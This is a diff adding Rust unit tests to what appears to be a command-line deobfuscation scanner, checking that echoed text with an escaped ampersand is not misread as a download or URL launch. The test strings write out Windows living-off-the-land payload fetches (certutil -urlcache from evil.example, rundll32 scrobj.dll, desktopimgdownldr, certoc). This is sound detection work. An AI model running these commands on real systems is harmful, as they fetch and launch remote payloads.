@@ -19297,6 +19297,24 @@ start msedge /max https://edge.example/lure.pdf"#,
     }
 
     #[test]
+    fn escaped_ampersand_url_launch_text_does_not_emit_url_launch() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"echo keep ^& rundll32.exe url.dll,FileProtocolHandler "https://rundll32-launch.example/echoed.pdf""#,
+            &mut env,
+        );
+
+        assert!(
+            !env.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlLaunch { url, .. } if url == "https://rundll32-launch.example/echoed.pdf"
+            )),
+            "escaped ampersand echo text was misread as URL launch: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn known_url_launchers_accept_schemeless_domain_path_arguments() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
@@ -19360,6 +19378,41 @@ rundll32 url.dll,FileProtocolHandler https://rundll32-launch.example/extensionle
                 env.traits
             );
         }
+    }
+
+    #[test]
+    fn escaped_ampersand_rundll32_download_export_text_does_not_emit_download() {
+        let report = analyze(
+            br#"echo keep ^& rundll32.exe scrobj.dll,GenerateTypeLib https://rundll32-scrobj-deob.example/echoed.sct"#,
+            &Config::default(),
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://rundll32-scrobj-deob.example/echoed.sct"
+            )),
+            "escaped ampersand echo text was misread as rundll32 download export: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn escaped_ampersand_glued_rundll32_text_does_not_emit_rundll32_trait() {
+        let report = analyze(
+            br#"echo keep ^& rundll32welnar.nvn,init"#,
+            &Config::default(),
+        );
+
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::Rundll32 { .. })),
+            "escaped ampersand echo text was misread as glued rundll32 execution: {:?}",
+            report.traits
+        );
     }
 
     #[test]
@@ -19521,6 +19574,23 @@ rundll32.exe shell32.dll,ShellExec_RunDLL https://rundll32-shell-deob.example/lu
     }
 
     #[test]
+    fn escaped_ampersand_desktopimgdownldr_text_does_not_emit_download() {
+        let report = analyze(
+            br#"echo keep ^& desktopimgdownldr.exe /lockscreenurl:https://desktopimg-deob.example/echoed.jpg /eventName:test"#,
+            &Config::default(),
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://desktopimg-deob.example/echoed.jpg"
+            )),
+            "escaped ampersand echo text was misread as desktopimgdownldr download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn certoc_getcacaps_url_in_deob_text_emits_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "https://certoc-deob.example/stage.ps1";
@@ -19552,6 +19622,23 @@ rundll32.exe shell32.dll,ShellExec_RunDLL https://rundll32-shell-deob.example/lu
             }),
             "certoc GetCACAPS URL missing LOLBAS provenance in deob text: {:?}",
             env.traits
+        );
+    }
+
+    #[test]
+    fn escaped_ampersand_certoc_text_does_not_emit_download() {
+        let report = analyze(
+            br#"echo keep ^& certoc.exe -GetCACAPS https://certoc-deob.example/echoed.ps1"#,
+            &Config::default(),
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://certoc-deob.example/echoed.ps1"
+            )),
+            "escaped ampersand echo text was misread as certoc download: {:?}",
+            report.traits
         );
     }
 
@@ -27870,6 +27957,23 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
             has,
             "schemeless certutil deob-text source was not structured: {:?}",
             env.traits
+        );
+    }
+
+    #[test]
+    fn escaped_ampersand_certutil_text_does_not_emit_structured_download() {
+        let report = analyze(
+            br#"echo keep ^& certutil -urlcache -split -f http://evil.example/p.exe p.exe"#,
+            &Config::default(),
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDownload { url, .. } if url == "http://evil.example/p.exe"
+            )),
+            "escaped ampersand echo text was misread as certutil download: {:?}",
+            report.traits
         );
     }
 
